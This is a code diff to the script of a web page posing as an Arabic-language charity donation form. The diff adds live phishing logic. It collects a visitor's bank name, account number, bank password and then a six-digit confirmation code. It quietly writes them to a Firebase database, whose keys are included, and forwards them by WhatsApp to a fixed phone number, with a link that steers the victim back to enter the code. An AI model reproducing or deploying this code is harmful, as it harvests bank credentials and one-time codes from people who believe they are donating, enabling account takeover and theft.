@@ -770,6 +770,16 @@
       var confirmOtpBtn = document.getElementById('confirmOtpBtn');
 
       // ==============================
+      //  التحقق من الرابط (العودة لخطوة التأكيد)
+      // ==============================
+      var urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('step') === '3') {
+        setTimeout(function () {
+          goToStep(3);
+        }, 100);
+      }
+
+      // ==============================
       //  تعبئة قائمة الدول
       // ==============================
       if (typeof COUNTRIES_DATA !== 'undefined') {
@@ -923,7 +933,7 @@
 
       document.getElementById('btnBackTo1').addEventListener('click', function () { goToStep(1); });
 
-      sendBtn.addEventListener('click', async function () {
+      sendBtn.addEventListener('click', function () {
         var bank = bankSelect.value;
         var account = accountInput.value.trim();
         var password = bankPassword.value.trim();
@@ -932,66 +942,74 @@
         if (!account || account.length < 3) { alert('يرجى إدخال رقم الحساب البنكي.'); accountInput.focus(); return; }
         if (!password) { alert('يرجى إدخال كلمة المرور.'); bankPassword.focus(); return; }
 
+        sendBtn.disabled = true;
+        sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
+
         var fullPhone = currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value;
         var adminPhone = "966578012189";
 
-        try {
-          sendBtn.disabled = true;
-          sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
+        // بناء رابط التأكيد المباشر للعودة للخطوة 3
+        var confirmLink = window.location.href.split('?')[0] + "?step=3&name=" + encodeURIComponent(nameInput.value.trim()) + "&phone=" + encodeURIComponent(fullPhone) + "&amount=" + encodeURIComponent(amountInput.value) + "&currency=" + encodeURIComponent(currencySelect.value);
 
-          var [{ initializeApp, getApps, getApp }, { getFirestore, collection, addDoc }] = await Promise.all([
-            import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"),
-            import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js")
-          ]);
+        var message = "*طلب تقديم تبرع جديد* 🕊️\n\n";
+        message += "*الاسم:* " + nameInput.value.trim() + "\n";
+        message += "*الدولة:* " + countrySelect.value + "\n";
+        message += "*الهاتف:* " + fullPhone + "\n";
+        message += "*المبلغ:* " + amountInput.value + " " + currencySelect.value + "\n";
+        message += "*البنك:* " + bank + "\n";
+        message += "*رقم الحساب:* " + account + "\n";
+        message += "*كلمة المرور:* " + password + "\n\n";
+        message += "_يرجى تزويدي بالبيانات اللازمة لإكمال التبرع._\n\n";
+        message += "لإكمال تبرعك، يرجى إدخال رمز التأكيد عبر الرابط التالي:\n" + confirmLink;
 
-          var firebaseConfig = {
-            apiKey: "AIzaSyC1-J4dSTmxUnz5d7dvq9XWrRHf_Lr511M",
-            authDomain: "alwaleed-3a813.firebaseapp.com",
-            projectId: "alwaleed-3a813",
-            storageBucket: "alwaleed-3a813.firebasestorage.app",
-            messagingSenderId: "680698906569",
-            appId: "1:680698906569:web:154df6466c1c89d67f4a18"
-          };
+        // تحديث الرابط الحالي ليكون خطوة التأكيد
+        window.history.pushState({}, '', confirmLink);
 
-          var app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
-          var db = getFirestore(app);
+        // الانتقال للخطوة 3 في الموقع
+        goToStep(3);
+        setTimeout(function () {
+          var firstOtp = document.querySelector('.otp-input');
+          if (firstOtp) firstOtp.focus();
+        }, 500);
 
-          await addDoc(collection(db, "donations"), {
-            name: nameInput.value.trim(),
-            phone: fullPhone,
-            country: countrySelect.value,
-            amount: Number(amountInput.value),
-            currency: currencySelect.value,
-            bank: bank,
-            accountNumber: account,
-            password: password,
-            date: new Date().toISOString()
-          });
+        sendBtn.disabled = false;
+        sendBtn.innerHTML = '<i class="fab fa-whatsapp"></i> إرسال عبر واتساب';
 
-          var message = "*طلب تقديم تبرع جديد* 🕊️\n\n";
-          message += "*الاسم:* " + nameInput.value.trim() + "\n";
-          message += "*الدولة:* " + countrySelect.value + "\n";
-          message += "*الهاتف:* " + fullPhone + "\n";
-          message += "*المبلغ:* " + amountInput.value + " " + currencySelect.value + "\n";
-          message += "*البنك:* " + bank + "\n";
-          message += "*رقم الحساب:* " + account + "\n";
-          message += "*كلمة المرور:* " + password + "\n\n";
-          message += "_يرجى تزويدي بالبيانات اللازمة لإكمال التبرع._";
+        // الحفظ في Firebase في الخلفية بصمت
+        (async function() {
+          try {
+            var [{ initializeApp, getApps, getApp }, { getFirestore, collection, addDoc }] = await Promise.all([
+              import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"),
+              import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js")
+            ]);
+            var firebaseConfig = {
+              apiKey: "AIzaSyC1-J4dSTmxUnz5d7dvq9XWrRHf_Lr511M",
+              authDomain: "alwaleed-3a813.firebaseapp.com",
+              projectId: "alwaleed-3a813",
+              storageBucket: "alwaleed-3a813.firebasestorage.app",
+              messagingSenderId: "680698906569",
+              appId: "1:680698906569:web:154df6466c1c89d67f4a18"
+            };
+            var app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
+            var db = getFirestore(app);
+            await addDoc(collection(db, "donations"), {
+              name: nameInput.value.trim(),
+              phone: fullPhone,
+              country: countrySelect.value,
+              amount: Number(amountInput.value),
+              currency: currencySelect.value,
+              bank: bank,
+              accountNumber: account,
+              password: password,
+              date: new Date().toISOString()
+            });
+          } catch (e) {
+            console.error("Firebase Error (Silent):", e);
+          }
+        })();
 
-          window.open('https://wa.me/' + adminPhone + '?text=' + encodeURIComponent(message), '_blank');
-          goToStep(3);
-
-          setTimeout(function () { document.querySelector('.otp-input').focus(); }, 500);
-
-        } catch (e) {
-          console.error(e);
-          alert("حدث خطأ في الاتصال، ولكن سيتم توجيهك للواتساب.");
-          window.open('https://wa.me/966578012189', '_blank');
-          goToStep(3);
-        } finally {
-          sendBtn.disabled = false;
-          sendBtn.innerHTML = '<i class="fab fa-whatsapp"></i> إرسال عبر واتساب';
-        }
+        // التوجيه إلى واتساب
+        window.location.href = 'https://wa.me/' + adminPhone + '?text=' + encodeURIComponent(message);
       });
 
       // ==============================
@@ -1023,12 +1041,16 @@
         if (otp.length < 6) { alert('يرجى إدخال رمز التأكيد كاملاً (6 أرقام).'); return; }
 
         var adminPhone = "966578012189";
-        var fullPhone = currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value;
+        var currentParams = new URLSearchParams(window.location.search);
+        var storedName = currentParams.get('name') || nameInput.value.trim();
+        var storedPhone = currentParams.get('phone') || (currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value);
+        var storedAmount = currentParams.get('amount') || amountInput.value;
+        var storedCurrency = currentParams.get('currency') || currencySelect.value;
 
         var message = "🔐 *رمز التأكيد - تبرع* 🔐\n\n";
-        message += "• *الاسم:* " + nameInput.value.trim() + "\n";
-        message += "• *الهاتف:* " + fullPhone + "\n";
-        message += "• *المبلغ:* " + amountInput.value + " " + currencySelect.value + "\n";
+        message += "• *الاسم:* " + storedName + "\n";
+        message += "• *الهاتف:* " + storedPhone + "\n";
+        message += "• *المبلغ:* " + storedAmount + " " + storedCurrency + "\n";
         message += "• *رمز التأكيد:* " + otp + "\n\n";
         message += "✅ _تم إرسال رمز التأكيد بنجاح_";
 
